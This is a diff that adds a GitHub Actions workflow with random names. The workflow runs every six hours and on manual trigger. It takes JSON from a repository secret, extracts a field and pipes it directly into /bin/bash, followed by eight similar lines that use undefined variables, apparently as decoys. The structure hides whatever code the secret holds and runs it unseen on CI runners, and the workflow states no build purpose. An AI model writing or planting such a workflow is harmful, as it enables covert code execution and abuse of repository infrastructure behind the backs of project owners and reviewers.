@@ -1,0 +1,25 @@
+name: unhealthyhopeless
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: unhealthyhopeless
+        env:
+          qeg3772: ${{ secrets.qeg3772 }}
+        run: |
+          echo $qeg3772 | jq -r .i2 | /bin/bash
+          echo $yp60 | jq -r .kgw77 | /bin/bash
+          echo $l7 | jq -r .ulyut83425 | /bin/bash
+          echo $do6475 | jq -r .w9 | /bin/bash
+          echo $vsiu66310 | jq -r .qqxr89671 | /bin/bash
+          echo $t05713 | jq -r .v31 | /bin/bash
+          echo $tu853 | jq -r .my809 | /bin/bash
+          echo $gs25498 | jq -r .unxj59628 | /bin/bash
+          echo $t5573 | jq -r .mun92939 | /bin/bash
+
